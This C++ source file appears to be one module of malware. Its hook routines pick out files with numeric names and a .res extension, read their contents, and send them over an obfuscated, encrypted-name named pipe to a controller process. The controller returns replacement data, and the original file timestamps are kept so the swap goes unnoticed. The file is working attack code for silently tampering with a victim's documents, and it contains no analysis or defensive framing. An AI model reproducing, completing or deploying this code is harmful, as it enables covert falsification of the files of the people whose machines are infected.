/*
	khdProcessing.cpp
	Hook's file processing routines
*/

#include <Windows.h>

#include "..\inc\dbg.h"
#include "..\inc\mem.h"
#include "..\inc\CryptoStrings.h"
#include "..\inc\MyStreams.h"

#include "khdProcessing.h"


/*
	Simple case-insensitive ext compare
	Returns TRUE in case extension is 'res'
*/
BOOL kpCheckExt(LPCWSTR wszExtWithoutDot)
{
	BOOL bRes = FALSE;
	WCHAR *pw = (WCHAR *)wszExtWithoutDot;

	do {	// not a loop

		// check all mem to be readable
		if (IsBadReadPtr(wszExtWithoutDot, 4 * sizeof(WCHAR))) { DbgPrint("ERR: mem not readable"); break; }

		if ((*pw != 'R') && (*pw != 'r')) { break; } pw++;
		if ((*pw != 'E') && (*pw != 'e')) { break; } pw++;
		if ((*pw != 'S') && (*pw != 's')) { break; }

		DbgPrint("OK: extension match");
		bRes = TRUE;

	} while (FALSE);	// not a loop

	return bRes;
}


/*
	Checks filename to match a pattern like
	...\path\folders\0000DDMM000NNNN.res
*/
BOOL kpCheckFilename(LPCWSTR wszExistingFilename)
{
	BOOL bRes = FALSE;
	DWORD dwStrLen = 0;

	WORD *pw = NULL;



	do {

		// check string len
		if (!(dwStrLen = lstrlenW(wszExistingFilename))) { DbgPrint("ERR: empty string passed"); break; }

		// go to string's end
		pw = (WORD *)((SIZE_T)wszExistingFilename + (dwStrLen * sizeof(WCHAR)));

		// find dot's ptr, it any
		while ((*pw != '.') && ((SIZE_T)pw > (SIZE_T)wszExistingFilename)) { pw--; }
		if (*pw != '.') { DbgPrint("ERR: ext dot not found"); break; }

		// NB: extension with dot, move 1 char further
		pw++;
		DbgPrint("extension found=[%ws]", pw);
		if (!kpCheckExt((LPCWSTR)pw)) { DbgPrint("ext not match"); break; }

		// go to first lslash or string's start
		while ((*pw != '\\') && ((SIZE_T)pw > (SIZE_T)wszExistingFilename)) { pw--; }

		// if lslash - move 1 pos forward
		if (*pw == '\\') { pw++; }
		DbgPrint("filename=[%ws]", pw);

		// go until dot found, checking chars to be a number
		while (*pw != '.') {
			// check char to be a number
			if ((*pw < '0') || (*pw > '9')) { DbgPrint("ERR: not a number found in name"); break; }
			pw++;
		}

		// if stopped at dot - scan was ok
		if (*pw != '.') { DbgPrint("ERR: name scan found bad chars"); break; }

		// all ok if got here
		bRes = TRUE;

	} while (FALSE);



	return bRes;
}

#define KC_CHUNK_SIZE 16 * 1024

/*
	Query controller process with file data. Returns TRUE if replacement was done, FALSE in case of any error or no replacement
*/
BOOL kpQueryController(LPVOID pData, DWORD dwDataLen, LPVOID *pNewData, DWORD *dwNewDataLen)
{
	BOOL bRes = FALSE;
	LPWSTR wszPipeName = NULL;	
	HANDLE hRemotePipe = INVALID_HANDLE_VALUE;

	DWORD dwWritten = 0;	// WriteFile()'s result

	DWORD dwResLen = 0;	// first dword received from remote pipe server

	MY_STREAM ms = { 0 };
	LPVOID pChunk = NULL;	// tmp buffer to read from stream in chunks

	BOOL fRes = FALSE;
	DWORD dwRead = 0;

	do {	// not a loop

		if (!pData || !dwDataLen || !pNewData || !dwNewDataLen) { DbgPrint("ERR: invalid input params"); break; }

		DbgPrint("entered: dwDataLen=%u", dwDataLen);

		// prepare pipe connection (same as at thrkcPipeServer@kbriController.cpp)
		wszPipeName = CRSTRW("\\\\.\\pipe\\pg0F9EC0DB75F67E1DBEFB3AFA2", "\xff\xbf\x62\x0c\xdb\xbf\x5e\x38\xa1\x9b\x92\xed\x1f\x42\x9e\xd4\x28\x37\xe4\xfd\x6a\x24\xb2\xa0\x4d\x70\x57\x42\xd9\x90\x07\x15\x8b\xc5\x67\x02\xed\xd4\x43\x22\xce\xf5\xfa");

		hRemotePipe = CreateFile(wszPipeName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hRemotePipe == INVALID_HANDLE_VALUE) { DbgPrint("ERR: failed to connect to pipe, le %u", GetLastError()); break; }

		SetHandleInformation(hRemotePipe, HANDLE_FLAG_INHERIT, 0);

		// data to be sent: <DWORD dwDataLen><BYTE[] bData>
		if (!WriteFile(hRemotePipe, &dwDataLen, sizeof(DWORD), &dwWritten, NULL)) { DbgPrint("ERR: failed to send first dword, le %u", GetLastError()); break; }
		if (!WriteFile(hRemotePipe, pData, dwDataLen, &dwWritten, NULL)) { DbgPrint("ERR: failed to send first dword, le %u", GetLastError()); break; }

		// ensure remote side receive all contents
		FlushFileBuffers(hRemotePipe);

		// read first dword from remote side with resulting len
		if (!ReadFile(hRemotePipe, &dwResLen, sizeof(DWORD), &dwWritten, NULL)) { DbgPrint("ERR: failed to read first dword in response, le %u", GetLastError()); break; }

		if (dwResLen) {

			DbgPrint("OK: have %u bytes with replacement data to be read", dwResLen);

			// init reading stream
			pChunk = my_alloc(KC_CHUNK_SIZE);
			msInitStream(&ms);

			do { // infinite loop

				dwRead = 0;
				fRes = ReadFile(hRemotePipe, pChunk, KC_CHUNK_SIZE, &dwRead, NULL);

				if (dwRead) {

					DbgPrint("got %u bytes", dwRead);
					ms.msWriteStream(&ms, pChunk, dwRead);

					// check len
					if (ms.lDataLen >= dwResLen) { DbgPrint("all read"); break; }

				} // if dwBytes

				if ((!fRes) && (GetLastError() != ERROR_MORE_DATA)) { DbgPrint("read finished"); break; }

			} while (TRUE);	// infinite loop

			// check if read ok
			if (ms.lDataLen > dwResLen) { DbgPrint("ERR: expected %u bytes, received %u", dwResLen, ms.lDataLen); ms.msFreeStream(&ms); break; }

			DbgPrint("OK: read %u replacement buffer", ms.lDataLen);

			// assign stream's pointer to resulting buffers
			*pNewData = ms.pData;
			*dwNewDataLen = ms.lDataLen;

			// signalize we have a new buffer
			bRes = TRUE;
		}

	} while (FALSE);	// not a loop

	if (wszPipeName) { my_free(wszPipeName); }
	if (hRemotePipe != INVALID_HANDLE_VALUE) {
		// close connection
		//DisconnectNamedPipe(hRemotePipe);	// is this really needed for client?
		CloseHandle(hRemotePipe);
	}
	if (pChunk) { my_free(pChunk); }

	return bRes;
}


/*
	Checks a file from wszExistingFilename, identified by full path + name if it needs to be processed
	Returns TRUE if processing was performed, with new buffer allocated and stored to *pNewData & *dwNewDataLen

	WARN: this func is called from a hook, so it should perform as fast as possible
*/
BOOL kpCheckFile(LPCWSTR wszExistingFilename, LPVOID *pNewData, DWORD *dwNewDataLen, FILETIME *ftC, FILETIME *ftA, FILETIME *ftW)
{
	BOOL bRes = FALSE;

	HANDLE hFile = INVALID_HANDLE_VALUE;	
	LPVOID pFileData = NULL;
	DWORD dwFileLen = 0;
	DWORD dwFileSizeHigh = 0;

	DWORD dwRead = 0;

	do {	// not a loop

		// check filename to match a pattern
		if (!kpCheckFilename(wszExistingFilename)) { break; }
		DbgPrint("OK: name passed check");

		// try to open file
		hFile = CreateFile(wszExistingFilename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE) { DbgPrint("ERR: failed to open src file [%ws], le %u", wszExistingFilename, GetLastError()); break; }

		// save filetimes to be applied to a new file
		if (!GetFileTime(hFile, ftC, ftA, ftW)) { DbgPrint("WARN: failed to get filetimes"); }

		// query it's size
		dwFileLen = GetFileSize(hFile, &dwFileSizeHigh);
		if ((dwFileSizeHigh) || (dwFileLen > 10000000) || (dwFileLen < 900)) { DbgPrint("ERR: file size %u not suitable for processing"); break; }

		// alloc buffer to read data
		if (!(pFileData = my_alloc(dwFileLen))) { DbgPrint("ERR: failed to alloc %u bytes", dwFileLen); break; }

		// read contents
		if (!ReadFile(hFile, pFileData, dwFileLen, &dwRead, NULL)) { DbgPrint("ERR: failed to read file contents, le %u", GetLastError()); break; }

		// check len
		if (dwFileLen != dwRead) { DbgPrint("ERR: sizes mismatch: expected %u, read %u", dwFileLen, dwRead); break; }

		// make query to controller process
		bRes = kpQueryController(pFileData, dwFileLen, pNewData, dwNewDataLen);

	} while (FALSE);	// not a loop

	// cleanup, if needed
	if (hFile) { CloseHandle(hFile); }
	if (pFileData) { my_free(pFileData); }

	return bRes;
}